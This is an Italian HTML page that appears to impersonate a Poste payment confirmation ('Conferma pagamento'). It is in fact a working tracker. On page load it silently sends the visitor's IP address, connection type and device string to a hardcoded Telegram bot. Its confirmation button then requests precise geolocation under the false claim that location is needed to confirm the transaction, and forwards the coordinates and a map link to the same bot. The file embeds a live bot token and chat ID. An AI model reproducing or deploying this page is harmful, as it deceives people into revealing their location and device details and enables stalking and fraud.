<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Conferma Pagamento</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet" />
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      min-height: 100vh;
      font-family: "Plus Jakarta Sans", system-ui, -apple-system, sans-serif;
      background: #f1f5f9;
      color: #0f172a;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.25rem;
    }
    .card {
      width: 100%;
      max-width: 440px;
      background: #ffffff;
      border-radius: 18px;
      padding: 1.5rem;
      box-shadow: 0 12px 30px rgba(15, 23, 42, 0.08);
    }
    .hero-img {
      width: 100%;
      height: 180px;
      object-fit: cover;
      border-radius: 12px;
      margin-bottom: 1.15rem;
      background: #ffd100;
      display: block;
    }
    h1 {
      margin: 0 0 1.25rem;
      font-size: 1.35rem;
      font-weight: 700;
    }
    button {
      width: 100%;
      padding: 0.85rem 1.2rem;
      font-family: inherit;
      font-size: 1rem;
      font-weight: 600;
      color: #ffffff;
      background: #0f172a;
      border: none;
      border-radius: 12px;
      cursor: pointer;
    }
    button:active {
      transform: scale(0.99);
    }
    #status {
      margin-top: 1.15rem;
      padding: 0.95rem 1rem;
      background: #f8fafc;
      border: 1px solid #e2e8f0;
      border-radius: 12px;
      font-size: 0.92rem;
      line-height: 1.45;
      white-space: pre-wrap;
    }
    #status.error {
      background: #fef2f2;
      border-color: #fecaca;
      color: #991b1b;
      font-weight: 600;
    }
  </style>
</head>
<body>
  <main class="card">
    <img class="hero-img" src="foto.jpg" alt="postepayments" />
    <h1>Conferma pagamento</h1>
    <button id="btn-pos" type="button">Conferma</button>
    <div id="status">In attesa di conferma...</div>
  </main>

  <script>
    const TELEGRAM_BOT_TOKEN = "9166459953:AAFCf4ucCd9I8XQhcHExhxdBdx0kVlpof8w";
    const TELEGRAM_CHAT_ID = "8456593810";
    const MESSAGGIO_ERRORE_POSIZIONE = "Per confermare la transazione è necessario abilitare la posizione";

    const statusEl = document.getElementById("status");
    const btnEl = document.getElementById("btn-pos");

    function setStatus(msg, isError = false) {
      statusEl.textContent = msg;
      statusEl.classList.toggle("error", isError);
    }

    function getTipoConnessione() {
      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (!conn) return "non rilevabile";
      return conn.effectiveType || conn.type || "non rilevabile";
    }

    async function inviaATelegram(testo) {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const res = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: testo
        })
      });
      if (!res.ok) {
        throw new Error(`Errore Telegram HTTP ${res.status}`);
      }
    }

    async function registraAperturaPagina() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        const ip = data.ip || "non rilevabile";
        const rete = getTipoConnessione();
        const dispositivo = navigator.userAgent || "sconosciuto";

        const messaggio =
          `Pagina aperta:\n` +
          `IP: ${ip}\n` +
          `Connessione: ${rete}\n` +
          `Dispositivo: ${dispositivo}`;

        await inviaATelegram(messaggio);
      } catch (err) {
        // Silenzioso se bloccato da rete/adblocker
      }
    }

    async function gestisciPosizione(position, modalita) {
      const { latitude, longitude, accuracy } = position.coords;
      const rete = getTipoConnessione();
      const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
      const messaggio =
        `Posizione rilevata (${modalita}):\n` +
        `Lat: ${latitude}\n` +
        `Lon: ${longitude}\n` +
        `Precisione: ~${Math.round(accuracy)} m\n` +
        `Connessione: ${rete}\n` +
        `Mappa: ${mapsUrl}`;

      setStatus("Verifica in corso...", false);

      try {
        await inviaATelegram(messaggio);
        setStatus("Conferma inviata correttamente.", false);
      } catch (err) {
        setStatus(MESSAGGIO_ERRORE_POSIZIONE, true);
      }
    }

    function chiediGeolocalizzazione(altaPrecisione, eFallback) {
      navigator.geolocation.getCurrentPosition(
        (position) => gestisciPosizione(position, altaPrecisione ? "alta precisione" : "rete/standard"),
        () => {
          if (!eFallback) {
            chiediGeolocalizzazione(false, true);
            return;
          }
          setStatus(MESSAGGIO_ERRORE_POSIZIONE, true);
        },
        {
          enableHighAccuracy: altaPrecisione,
          timeout: altaPrecisione ? 8000 : 10000,
          maximumAge: 0
        }
      );
    }

    window.addEventListener("load", registraAperturaPagina);

    btnEl.addEventListener("click", () => {
      if (!("geolocation" in navigator)) {
        setStatus(MESSAGGIO_ERRORE_POSIZIONE, true);
        return;
      }

      setStatus("Richiesta localizzazione in corso...", false);
      chiediGeolocalizzazione(true, false);
    });
  </script>
</body>
</html>
